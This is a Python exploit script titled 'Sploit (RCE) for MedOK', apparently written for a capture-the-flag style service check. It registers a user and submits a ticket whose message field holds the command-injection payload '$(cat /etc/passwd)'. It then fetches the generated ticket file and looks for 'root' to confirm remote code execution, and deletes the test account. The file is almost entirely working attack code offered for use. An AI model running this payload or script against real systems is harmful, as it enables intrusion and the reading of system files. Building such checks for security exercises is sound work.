# Sploit (RCE) for MedOK
# Author: boomgarang

import re
import aiohttp
import asyncio
from colorama import Fore, Style
from .medok_sploit__helper import register_user, delete_user_from_db

async def sploit_rce(HOST, PORT):
    register_resp = await register_user(HOST, PORT)
    if register_resp[0] != 101:
        return register_resp[0], None
    email, cookies = register_resp[1]

    try:
        async with aiohttp.ClientSession(cookies=cookies) as session:
            data = {
                'name': 'Exploit',
                'phone': '123456',
                'message': '$(cat /etc/passwd)'
            }
            async with session.post(f'http://{HOST}:{PORT}/ticket', data=data) as response:
                if response.status == 200:
                    print(Fore.GREEN + f"[+] Sploit 2 (Medok): {HOST}:{PORT} - Exploit sent successfully" + Style.RESET_ALL)
                    async with session.get(f'http://{HOST}:{PORT}/profile') as profile_response:
                        if profile_response.status == 200:
                            profile_text = await profile_response.text()
                            ticket_link = re.search(r'static/tickets/([a-f0-9]{32}/ticket_\d{5}\.txt)', profile_text)
                            if ticket_link:
                                ticket_url = f"http://{HOST}:{PORT}/{ticket_link.group()}"
                                print(Fore.GREEN + f"[+] Sploit 2 (Medok): {HOST}:{PORT} - Found ticket URL: {ticket_url}" + Style.RESET_ALL)
                                async with session.get(ticket_url) as ticket_response:
                                    ticket_text = await ticket_response.text()
                                    delete_status = await delete_user_from_db(email, HOST)
                                    if delete_status[0] != 101:
                                        return delete_status
                                    if "root" in ticket_text:
                                        print(Fore.GREEN + f"[+] Sploit 2 (Medok): {HOST}:{PORT} - RCE exploit confirmed!" + Style.RESET_ALL)
                                        return 101, None
                                    else:
                                        print(Fore.RED + f"[-] Sploit 2 (Medok): {HOST}:{PORT} - RCE exploit not triggered" + Style.RESET_ALL)
                                        return 102, None
                            else:
                                print(Fore.RED + f"[-] Sploit 2 (Medok): {HOST}:{PORT} - Ticket link not found in profile" + Style.RESET_ALL)
                                await delete_user_from_db(email, HOST)
                                return 102, None
                        else:
                            print(Fore.RED + f"[-] Sploit 2 (Medok): {HOST}:{PORT} - Can't get user profile: {profile_text}")
                            await delete_user_from_db(email, HOST)
                            return 102, None
                else:
                    print(Fore.RED + f"[-] Sploit 2 (Medok): {HOST}:{PORT} - Error sending exploit: {response.text}" + Style.RESET_ALL)
                    await delete_user_from_db(email, HOST)
                    return 102, None
    except Exception as e:
        print(Fore.RED + f"[-] Sploit 2 (Medok): {HOST}:{PORT} - An error occurred: {e}" + Style.RESET_ALL)
        return 102, None

async def pwn(HOST):
    VERDICT = await sploit_rce(HOST, 5000)
    print(VERDICT)
    return VERDICT
